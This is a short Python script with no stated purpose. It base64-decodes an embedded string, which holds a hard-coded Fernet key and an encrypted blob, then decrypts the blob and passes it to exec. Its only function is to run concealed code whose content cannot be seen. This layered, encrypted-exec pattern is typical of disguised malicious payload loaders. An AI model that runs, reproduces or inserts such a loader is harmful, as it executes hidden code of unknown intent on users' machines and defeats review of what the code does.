import base64

a = """ 
a2V5ID0gJzRjYlhXNkhsOW5qODRidTVJN2x6c2NCQ3FOVFZzSEtLYlNuXzhLUEs4Q2M9JwplcGwgPSAnZ0FBQUFBQmY3MXBZdy1NNmpKS3BYWi1aMjhZbXJxQXV0elh3YlctUFhXVWhGNXpZMDVNQ3B5V2hzM3hZeFlLU3NvLTR6R3ZoZWw5UGE5R3dnMnV0bUt1RHh6azFXVm9SdFIwc1FWbXh3ZVRwdDFmeTBOaElta3hyQl81Ymxja2VuNFd0R1pqb2pFVmVRU3JfQVlRUWQ4N2x4bEdpNGduUThjNEFvNVFNbTM0WTI0Y1djMzBSbkNleEJaRFk5TnA3aHM1RzVjSGdKcXdfeUViekcyaGpwTEswcXJkR2pGNldBZWVhM1h2U2YzRTNhOEZudU83bEp1dXc1R3MwSm1JcVp4aVdiaTZWQkZPZnRtZUxkV21VNDFWQ3RTazJqbndtZ0pMTDVsVlVhSU9fTWR0NkhsaGU0R2Z2T1paaW1qRS1Ob0tsQldwaTIxa0dqN20zLWwtRktqZVJyU29hWWJ6ODczd3htNHhoNEFrTUpkX0ljblB3SWZOMVBVQkpOYWl3ZjB5ZWhGY0loTUdCekpERWNBR3VnWkpNR0R3NTJ3VTR0WnVucjRRVFp3YTVPb25MSkVNNVg5dUFQMDZXT19xLWVFSEt2Y1VOMHlzdjlXSHNNX1BTbUpCbUNKeDhib0RHem5DMzNkUkZ1YmFscl9EQlphSWphVmhrdGtRMnhXOURmZjNLRUJHUnhjcTFjVzk2N3ltREk3VDBiR3lGcG05N2k5ZklmQWlNRG9LbFF0SkhRSWluaVl4cXN1S3RGeXJEQmc1Rk9zWGJuaS1NVzU1WUZGOE9xNlEyQm9TQWFMLXV0R1RVZ3ZWTmpORnhxZVNiWmRPS1ZBMm9lVmVHbVdRNXdlcGJZckNyZVM2RycKZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXQKZiA9IEZlcm5ldChrZXkpCmMgPSBmLmRlY3J5cHQoZXBsKQpleGVjKGMp
"""
b = base64.b64decode(a)
exec(b)